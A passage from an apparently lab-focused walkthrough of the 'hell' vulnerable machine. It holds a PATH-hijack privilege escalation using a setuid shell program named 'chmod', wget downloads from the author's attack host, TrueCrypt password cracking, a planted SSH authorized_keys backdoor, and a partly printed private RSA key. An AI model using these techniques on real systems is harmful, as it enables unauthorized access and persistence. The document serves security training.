</span><span class='line'>State      Recv-Q Send-Q                                               Local Address:Port                                                 Peer Address:Port
</span><span class='line'>LISTEN     0      50                                                       127.0.0.1:3306                                                            &lt;em>:&lt;/em>   &lt;br/>
</span><span class='line'>LISTEN     0      128                                                              &lt;em>:57356                                                           &lt;/em>:&lt;em>   &lt;br/>
</span><span class='line'>LISTEN     0      128                                                             :::111                                                            :::&lt;/em>   &lt;br/>
</span><span class='line'>LISTEN     0      128                                                              &lt;em>:111                                                             &lt;/em>:&lt;em>   &lt;br/>
</span><span class='line'>LISTEN     0      128                                                             :::80                                                             :::&lt;/em>   &lt;br/>
</span><span class='line'>LISTEN     0      128                                                             :::59635                                                          :::&lt;em>   &lt;br/>
</span><span class='line'>LISTEN     0      128                                                             :::22                                                             :::&lt;/em>   &lt;br/>
</span><span class='line'>LISTEN     0      128                                                              &lt;em>:22                                                              &lt;/em>:&lt;em>   &lt;br/>
</span><span class='line'>LISTEN     0      10                                                               &lt;/em>:1337                                                            &lt;em>:&lt;/em>   &lt;br/>
</span><span class='line'>LISTEN     0      20                                                             ::1:25                                                             :::&lt;em>   &lt;br/>
</span><span class='line'>LISTEN     0      20                                                       127.0.0.1:25                                                              &lt;/em>:&lt;em>   &lt;br/>
</span><span class='line'>LISTEN     0      10                                                               &lt;/em>:666                                                             &lt;em>:&lt;/em>   &lt;br/>
</span><span class='line'>$</span></code></pre></td></tr></table></div></figure></p>

<p>After I run the game program and check listening ports, I found game is listening on port <em>1337</em>.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ telnet 127.0.0.1 1337
</span><span class='line'>Trying 127.0.0.1&hellip;
</span><span class='line'>Connected to 127.0.0.1.
</span><span class='line'>Escape character is &lsquo;^]&rsquo;.
</span><span class='line'>Type &lsquo;START&rsquo; to begin&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>START
</span><span class='line'>Starting&hellip;&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>You have 30 seconds to get as many points as you can, beat the high score! (High Score: 133723)&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>Quick what&rsquo;s&hellip; 769 x 49? 48
</span><span class='line'>Quick what&rsquo;s&hellip; 413 x 17? 15
</span><span class='line'>Quick what&rsquo;s&hellip; 779 x 106? 45
</span><span class='line'>Quick what&rsquo;s&hellip; 439 x 803? 55
</span><span class='line'>Quick what&rsquo;s&hellip; 555 x 341? 821
</span><span class='line'>Quick what&rsquo;s&hellip; 976 x 1?
</span><span class='line'>Lol nope&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>Final Score: 0&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>Connection closed by foreign host.
</span><span class='line'>[1] + Done                       ./game
</span><span class='line'>$</span></code></pre></td></tr></table></div></figure></p>

<p>In order to win the game, I wrote a python script to calculate and send the result back to program.</p>

<p><figure class='code'><figcaption><span>my_win.py  (my_win.py)</span> <a href='/downloads/code/my_win.py'>download</a></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
</span><span class='line'>
</span><span class='line'><span class="kn">import</span> <span class="nn">socket</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">re</span>
</span><span class='line'>
</span><span class='line'><span class="n">ip</span> <span class="o">=</span> <span class="s">&quot;127.0.0.1&quot;</span>
</span><span class='line'><span class="n">port</span> <span class="o">=</span> <span class="mi">1337</span>
</span><span class='line'>
</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'><span class="n">conn</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span><span class="n">port</span><span class="p">))</span>
</span><span class='line'><span class="n">res</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="n">res</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;START/n&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">res</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="n">res</span>
</span><span class='line'>
</span><span class='line'><span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
</span><span class='line'>	<span class="n">res</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
</span><span class='line'>	<span class="n">data</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s">r&quot;Quick what&#39;s\.\.\. (.*)\?&quot;</span><span class="p">,</span> <span class="n">res</span><span class="p">)</span>
</span><span class='line'>	<span class="k">if</span> <span class="ow">not</span> <span class="n">data</span><span class="p">:</span>
</span><span class='line'>		<span class="k">print</span> <span class="s">&quot;pattern is not found!&quot;</span>
</span><span class='line'>		<span class="k">print</span> <span class="n">res</span>
</span><span class='line'>		<span class="k">break</span>
</span><span class='line'>	<span class="k">else</span><span class="p">:</span>
</span><span class='line'>		<span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">)</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">&#39; x &#39;</span><span class="p">)</span>
</span><span class='line'>		<span class="n">rst</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">a</span><span class="p">)</span> <span class="o">*</span> <span class="nb">int</span><span class="p">(</span><span class="n">b</span><span class="p">)</span>
</span><span class='line'>		<span class="k">print</span> <span class="n">rst</span>
</span><span class='line'>		<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">rst</span><span class="p">)</span><span class="o">+</span><span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="s">&#39;[*] Done!&#39;</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>After running the script and win the game, something new appeared <code>I hear the faint sound of chmodding........</code>. That sounds like command <code>chmod</code> has been called after win the game.</p>

<p><img class="left" src="/downloads/Hell1/4.png"></p>

<p>Now I decided to check if the command <code>chmod</code> is called from absolute path or not. I upload setuid.c to target server&rsquo;s temporary directory <code>/tmp/</code>, compile it and change the name to <code>chmod</code>.</p>

<p><figure class='code'><figcaption><span>setuid.c  (setuid.c)</span> <a href='/downloads/code/setuid.c'>download</a></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;sys/types.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'> <span class="n">setuid</span><span class="p">(</span><span class="mi">1000</span><span class="p">);</span>
</span><span class='line'> <span class="n">system</span><span class="p">(</span> <span class="s">&quot;/bin/sh -i&quot;</span> <span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ wget &lt;a href="http://10.10.10.131/setuid.c">http://10.10.10.131/setuid.c&lt;/a>
</span><span class='line'>&ndash;2015-07-16 08:49:24&ndash;  &lt;a href="http://10.10.10.131/setuid.c">http://10.10.10.131/setuid.c&lt;/a>
</span><span class='line'>Connecting to 10.10.10.131:80&hellip; connected.
</span><span class='line'>HTTP request sent, awaiting response&hellip; 200 OK
</span><span class='line'>Length: 122 [text/x-csrc]
</span><span class='line'>Saving to: `setuid.c'&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>100%[======================================>] 122         &ndash;.-K/s   in 0s&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>2015-07-16 08:49:24 (14.9 MB/s) - `setuid.c' saved [122/122]&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>$ ls -l
</span><span class='line'>total 4
</span><span class='line'>-rw-r&ndash;r&ndash; 1 milk_4_life milk_4_life 122 Jul 15 22:47 setuid.c
</span><span class='line'>$</span></code></pre></td></tr></table></div></figure></p>

<p>Next I add <code>/tmp</code> to the beginning of the environmental PATH variable. Then I play the game and run python script to win.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ printenv PATH
</span><span class='line'>/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
</span><span class='line'>$ export PATH=/tmp:$PATH
</span><span class='line'>$ printenv PATH
</span><span class='line'>/tmp:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
</span><span class='line'>$ ./game
</span><span class='line'>I&rsquo;m listening
</span><span class='line'>$ whoami
</span><span class='line'>george
</span><span class='line'>$ id
</span><span class='line'>uid=1002(milk_4_life) gid=1002(milk_4_life) euid=1000(george) groups=1000(george),1002(milk_4_life)
</span><span class='line'>$</span></code></pre></td></tr></table></div></figure></p>

<p>Bingo! I am <code>george</code> now. After poking around in the file system, I found <code>container.tc</code> file (which is a Truecrypt encrypted file) in george&rsquo;s home directory. Also george has an email which shows a clue to crack the encrypted file by using rockyou password dictionary.</p>

<h2>Moving to <em>bazza</em></h2>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ pwd
</span><span class='line'>/home/george
</span><span class='line'>$ ls -l
</span><span class='line'>total 4096
</span><span class='line'>-rw&mdash;&mdash;- 1 george george 4194304 Jul 12 08:30 container.tc
</span><span class='line'>$ find / -user george -perm -g=s -o -perm -u=s -type f 2>/dev/null
</span><span class='line'>/usr/lib/openssh/ssh-keysign
</span><span class='line'>/usr/lib/pt_chown
</span><span class='line'>/usr/sbin/exim4
</span><span class='line'>/usr/bin/chsh
</span><span class='line'>/usr/bin/newgrp
</span><span class='line'>/usr/bin/sudo
</span><span class='line'>/usr/bin/procmail
</span><span class='line'>/usr/bin/chfn
</span><span class='line'>/usr/bin/gpasswd
</span><span class='line'>/usr/bin/passwd
</span><span class='line'>/usr/bin/sudoedit
</span><span class='line'>/usr/bin/game.py
</span><span class='line'>/usr/bin/lesson101
</span><span class='line'>/sbin/mount.nfs
</span><span class='line'>/var/mail/george
</span><span class='line'>/bin/umount
</span><span class='line'>/bin/ping
</span><span class='line'>/bin/su
</span><span class='line'>/bin/mount
</span><span class='line'>/bin/ping6
</span><span class='line'>$ ls -l /var/mail/george
</span><span class='line'>total 4
</span><span class='line'>-rw-r&ndash;r&ndash; 1 george george 175 Jun 20  2014 signup.eml
</span><span class='line'>$ cat /var/mail/george/signup.eml
</span><span class='line'>From: &lt;a href="&#109;&#x61;&#x69;&#108;&#x74;&#111;&#58;&#97;&#100;&#x6d;&#x69;&#110;&#64;&#x72;&#x6f;&#99;&#107;&#x79;&#111;&#x75;&#x2e;&#99;&#x6f;&#109;">&#97;&#x64;&#109;&#x69;&#x6e;&#64;&#114;&#x6f;&#x63;&#x6b;&#x79;&#111;&#x75;&#x2e;&#x63;&#x6f;&#x6d;&lt;/a>
</span><span class='line'>To: &lt;a href="&#109;&#97;&#x69;&#x6c;&#x74;&#x6f;&#x3a;&#115;&#117;&#112;&#x65;&#114;&#x5f;&#x61;&#100;&#x6d;&#x69;&#x6e;&#64;&#x68;&#x65;&#108;&#108;&#46;&#x63;&#x6f;&#109;">&#x73;&#117;&#x70;&#101;&#114;&#x5f;&#x61;&#x64;&#109;&#x69;&#x6e;&#64;&#x68;&#x65;&#x6c;&#x6c;&#x2e;&#99;&#x6f;&#109;&lt;/a>
</span><span class='line'>Subject: Account Activation
</span><span class='line'>Date: 13th November 2009&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>Thanks for signing up for your account. I hope you enjoy our services.
</span><span class='line'>$</span></code></pre></td></tr></table></div></figure></p>

<p>Then I downloaded the container file <code>container.tc</code> to my Kali and use <code>truecrack</code> with rockyou.txt to crack the password. Due to my laptop do not have a strong GPU so I could not take advantage of hashcat which is really disappointed. T.T</p>

<p>However, the hard way is still working, just a little slow&hellip; after waiting for a quite while, I finally cracked the password: <em><font color="red">letsyouupdateyourfunnotesandmore</font></em></p>

<p><img class="left" src="/downloads/Hell1/5.png"></p>

<p>In order to get a better shell with full privilege of george, I use ssh-keygen to generate a new ssh key pair (passphrase is <em><font color="red">test1337</font></em>) and upload the public key to target server as <code>.ssh/authorized_keys</code>. Then use the private key to login via SSH.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# ssh-keygen
</span><span class='line'>Generating public/private rsa key pair.
</span><span class='line'>Enter file in which to save the key (/root/.ssh/id_rsa): g_id_rsa
</span><span class='line'>Enter passphrase (empty for no passphrase):
</span><span class='line'>Enter same passphrase again:
</span><span class='line'>Your identification has been saved in g_id_rsa.
</span><span class='line'>Your public key has been saved in g_id_rsa.pub.
</span><span class='line'>The key fingerprint is:
</span><span class='line'>81:82:98:44:59:c7:f2:68:fe:b8:76:04:f1:b1:a2:97 root@kali
</span><span class='line'>The key&rsquo;s randomart image is:
</span><span class='line'>+&ndash;[ RSA 2048]&mdash;-+
</span><span class='line'>|.oo&hellip;           |
</span><span class='line'>|.+ +.o .         |
</span><span class='line'>|o . B + .        |
</span><span class='line'>|   = =   .       |
</span><span class='line'>|  + +   S        |
</span><span class='line'>| . E .           |
</span><span class='line'>|  . +            |
</span><span class='line'>|   o o           |
</span><span class='line'>|  ..o            |
</span><span class='line'>+&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+</span></code></pre></td></tr></table></div></figure></p>

<p>Now back to target server to create <code>.ssh</code> folder and pull the SSH private key from my Kali.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ mkdir .ssh
</span><span class='line'>$ cd .ssh
</span><span class='line'>$ wget &lt;a href="http://10.10.10.131/g_id_rsa.pub">http://10.10.10.131/g_id_rsa.pub&lt;/a> -O authorized_keys
</span><span class='line'>&ndash;2015-07-16 10:19:59&ndash;  &lt;a href="http://10.10.10.131/g_id_rsa.pub">http://10.10.10.131/g_id_rsa.pub&lt;/a>
</span><span class='line'>Connecting to 10.10.10.131:80&hellip; connected.
</span><span class='line'>HTTP request sent, awaiting response&hellip; 200 OK
</span><span class='line'>Length: 391
</span><span class='line'>Saving to: `authorized_keys'&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>100%[==================================================================================================>] 391         &ndash;.-K/s   in 0s&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>2015-07-16 10:19:59 (59.7 MB/s) - `authorized_keys' saved [391/391]&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>$ ls
</span><span class='line'>authorized_keys
</span><span class='line'>$ ls -l
</span><span class='line'>total 4
</span><span class='line'>-rw-r&ndash;r&ndash; 1 george milk_4_life 391 Jul 16 00:19 authorized_keys
</span><span class='line'>$ /bin/chmod 600 authorized_keys
</span><span class='line'>$ ls -l
</span><span class='line'>total 4
</span><span class='line'>-rw&mdash;&mdash;- 1 george milk_4_life 391 Jul 16 00:19 authorized_keys
</span><span class='line'>$</span></code></pre></td></tr></table></div></figure></p>

<p>SSH login with password <em><font color="red">test1337</font></em></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/hell# ssh &lt;a href="&#x6d;&#97;&#105;&#108;&#x74;&#111;&#x3a;&#x67;&#101;&#111;&#x72;&#x67;&#101;&#x40;&#x31;&#48;&#46;&#49;&#x30;&#x2e;&#x31;&#48;&#x2e;&#49;&#52;&#x36;">&#x67;&#x65;&#x6f;&#114;&#x67;&#x65;&#64;&#x31;&#x30;&#x2e;&#49;&#48;&#x2e;&#49;&#48;&#46;&#x31;&#52;&#x36;&lt;/a> -i g_id_rsa
</span><span class='line'>Enter passphrase for key &lsquo;g_id_rsa&rsquo;:
</span><span class='line'>Linux hell 3.2.0-4-486 #1 Debian 3.2.57-3+deb7u2 i686&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>The programs included with the Debian GNU/Linux system are free software;
</span><span class='line'>the exact distribution terms for each program are described in the
</span><span class='line'>individual files in /usr/share/doc/*/copyright.&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
</span><span class='line'>permitted by applicable law.
</span><span class='line'>No mail.
</span><span class='line'>Last login: Thu Jul 16 10:14:43 2015 from 10.10.10.131
</span><span class='line'>george@hell:~$ id
</span><span class='line'>uid=1000(george) gid=1000(george) groups=1000(george),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)
</span><span class='line'>george@hell:~$ pwd
</span><span class='line'>/home/george
</span><span class='line'>george@hell:~$ ls -l
</span><span class='line'>total 4096
</span><span class='line'>-rw&mdash;&mdash;- 1 george george 4194304 Jul 12 08:30 container.tc
</span><span class='line'>george@hell:~$</span></code></pre></td></tr></table></div></figure></p>

<p>After get into the truecrypt container, I found a RSA private key file which should be someone&rsquo;s SSH key.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>george@hell:~$ truecrypt container.tc
</span><span class='line'>Enter mount directory [default]:
</span><span class='line'>Enter password for /home/george/container.tc:
</span><span class='line'>Enter keyfile [none]:
</span><span class='line'>Protect hidden volume (if any)? (y=Yes/n=No) [No]:
</span><span class='line'>george@hell:~$ df -h
</span><span class='line'>Filesystem                                              Size  Used Avail Use% Mounted on
</span><span class='line'>rootfs                                                  7.6G  1.4G  5.8G  20% /
</span><span class='line'>udev                                                     10M     0   10M   0% /dev
</span><span class='line'>tmpfs                                                    51M  224K   51M   1% /run
</span><span class='line'>/dev/disk/by-uuid/c53be26e-768a-4c87-90d3-792c47148ca4  7.6G  1.4G  5.8G  20% /
</span><span class='line'>tmpfs                                                   5.0M     0  5.0M   0% /run/lock
</span><span class='line'>tmpfs                                                   178M     0  178M   0% /run/shm
</span><span class='line'>/dev/mapper/truecrypt1                                  3.8M  2.0K  3.8M   1% /media/truecrypt1
</span><span class='line'>george@hell:~$ cd /media/truecrypt1
</span><span class='line'>george@hell:/media/truecrypt1$ ls -l
</span><span class='line'>total 2
</span><span class='line'>-rwx&mdash;&mdash; 1 george george 1679 Jul  5  2014 id_rsa
</span><span class='line'>george@hell:/media/truecrypt1$ cat id_rsa
</span><span class='line'>&mdash;&ndash;BEGIN RSA PRIVATE KEY&mdash;&ndash;
</span><span class='line'>MIIEpQIBAAKCAQEAxlCbg0ln2dqRO3iIXPUvK3irg/9l5uvBAQdXTVmcm/JWN9OA
</span><span class='line'>25XtZX8LOfiJtc+8OYXgD6lXNVPh9BjElq6qpR7fk1TaXXUlyiSlwCxz68n/cpYs
</span><span class='line'>f6UUa9QXm0LSHD8m7g/e5qqIm8bb15TIC6+8TmSB11FE9NLPN+8hVyP1S9EBntom
</span><span class='line'>t5watKDFUNF+mcl14Tj+INcWB2qpEPgZ1mIwq1Zw3w/vy27y0i1r52+fot1vgf2K
</span><span class='line'>Ymo6GipsdxW1k/UuCjJEE6e0GZFA8vhpH5F4MG8k33vIPqkxgEgF0GX8RPAQF/Xf
</span><span class='line'>gxERhkGP+hVOd8b11OXzxWGGQyqwOYF8+7qVjwIDAQABAoIBAQCyldpFUvBDXbEV
</span><span class='line'>dgiOdXkh04vY1UBlv/3ROFQk4sLGKGf94+gRViUvFkX80VTptgWRY36Pe/Z9nmlG
</span><span class='line'>0JsP+oDPK0s4uNvf92Otcm0U7rMBLals/dFarUUDiT4s4fKl3zTmgsI+xGk6psxI
</span><span class='line'>icHPzFRt39KRHK1VLxXOD/jdKRN3Tk0odH1kNahOuFC2F5T+aqdlC/RAGwxnTDBe
</span><span class='line'>AFPFlns83GaPYlIt05DZsdGftG7mITkNfUVS5AIyeedshU4OyPXu5bGgUgbtars4
</span><span class='line'>GdttJ33Tm5hO+n3E93sW7XMKG4v4po+1Fu0OwNQNpaRo6gVqK7AZHNPxBRW7K4Zc
</span><span class='line'>w2d0EXehAoGBAOQgtqb5QVyhiCdT53xjZTMHH74ApWRpsoLtu/LaZnQV0v/dzEIv
</span><span class='line'>jei58v/PusXsSwOQeb4p2obOReQFbYG48vCiywwMbeOeqH2d69HYatHmxPXngKS3
</span><span class='line'>6trus/pHuDJosFw1qhgVo9ao0o8IH6cveHidmwvzKfiphgM3yCXF9jyxAoGBAN6L
</span><span class='line'>awHXmHQCsCq//UbHbfuaBScJOpaagKP1BIskl5RDaQ/U/DzSpxju0ldedX7HYVFW
</span><span class='line'>Rk6NQQ6QiXIC/5D7Xj+tcR2EFI+Tt9xp6dE/UlxpUL1h9QCBfmdw0CT9WSwJEGF7
</span><span class='line'>R+D18trKcb/NkYdJV8ZpaT00rLzyBx5MY/FZbYY/AoGBALrCwWXfR5BjOckgmrGt
</span><span class='line'>2cq1uVnew4h6M8eWgzklbZz5xPzuAuvobKAro3GkCb9BXIQ1gkWZlCqqsnMjsmvy
</span><span class='line'>EwnH7L0Xa9teJ4h3gfkQ2Rqwd2ztstanLyE/LJ7omjbCmCdVU8RV6wSwv3iTaP6B
</span><span class='line'>EXqFZMqarzDA8FKwFy49bAJxAoGBALkXBYG7uW1LSw/TLCjw9zVaTUzBLTxS9gjn
</span><span class='line'>YMcFQRir1Da5sqw3m4huIP1Pb7NoyjTm54SvkNs3NUlg2wPPPP0DGOAumRctCa9F
</span><span class='line'>W5WP78UyRlesoCOyj9oihsss9zxbsYcSDJ86j6iO1Xpr08zMIDfCNigUplJjja4S
</span><span class='line'>ZNE3ypLrAoGAbp+vBcqQRfnXWfmcdnHYFbwgWbokPSe2fScajWiyvcg4/6gL1e50
</span><span class='line'>rpO3RTOREUD02pBbyG4LDFv7x/5niqASL0tS8/0xWDBDj5QmD9UTmMd5hsMbj8Lw
